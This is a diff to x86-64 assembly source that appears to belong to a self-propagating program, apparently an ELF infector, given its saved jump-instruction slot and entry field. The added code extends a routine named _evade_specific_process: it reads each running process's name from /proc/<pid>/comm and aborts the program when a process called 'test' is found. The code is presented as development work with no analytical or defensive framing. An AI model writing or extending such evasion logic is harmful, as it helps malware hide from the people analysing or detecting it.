@@ -1,3 +1,4 @@
+%define SYS_READ		0
 %define SYS_WRITE		1
 %define SYS_OPEN 		2
 %define SYS_CLOSE		3
@@ -87,6 +88,8 @@
 ; r15 + 1508                                        entry dpuente
 ; r15 + 1516	(5 bytes)							jmp instruction
 
+; r15 + 1532                                        proc name buffer
+
 global _start
 
 section .text
@@ -166,8 +169,37 @@ _evade_specific_process:                                  ; cd to /proc
 				mov rax, SYS_CHDIR
 				syscall
 
+			_read_comm:
+				mov qword [rdi], 'comm'
+				mov rsi, O_RDONLY
+				mov rax, SYS_OPEN
+				syscall
+	
+				mov r9, rax
+				mov rdi, rax
+				lea rsi, [r15 + 1532]
+				mov rdx, 16
+				mov rax, SYS_READ
+				syscall
+
+				cmp rax, 5
+				jne _close_process_comm
+
+				cmp dword [r15 + 1532], "test"
+				jne _close_process_comm
+				_close_and_quit:
+					mov rdi, r9
+					mov rax, SYS_CLOSE
+					syscall
+					jmp _end
+		
+			_close_process_comm:
+				mov rdi, r9
+				mov rax, SYS_CLOSE
+				syscall
+
 			_return_proc:
-				mov qword [rdi], '..'
+				lea rdi, [r15]
 				mov rax, SYS_CHDIR
 				syscall
 
